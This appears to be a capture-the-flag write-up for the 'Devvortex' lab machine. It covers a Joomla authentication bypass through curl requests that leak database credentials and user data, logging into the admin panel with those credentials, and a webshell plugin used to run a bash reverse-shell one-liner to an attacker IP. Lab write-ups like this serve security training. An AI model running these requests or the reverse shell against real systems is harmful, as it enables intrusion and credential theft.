Devvortex

Devvortex is an "Easy" unix box.

This Joomla! version appears to be vulnerable to some authentication bypass, allowing an unauthenticated attacker to access to privileged information such as configuration file an database content - see there

Database credentials are leaked:

> curl -s 'http://dev.devvortex.htb/api/index.php/v1/config/application?public=true' | jq .

lewis : P4ntherg0t1n5r3c0n##

Also users information are leakable by requesting:

> curl -s 'http://dev.devvortex.htb/api/index.php/v1/users?public=true' | jq .

Foothold

Leaked credentials are used to access Joomla! administrative panel:

Injecting PHP code into theme pages does not work since the user running the application has no rights to write the file. Anyway, it's possible to install modules and plugins.

The Joomla Webshell Pluginis installed in order to obtain an interactive reverse shell, running:

> python console.py -t http://dev.devvortex.htb
>> bash -c 'bash -i >& /dev/tcp/10.10.14.247/8090 0>&1'

The user running the application is:

www-data
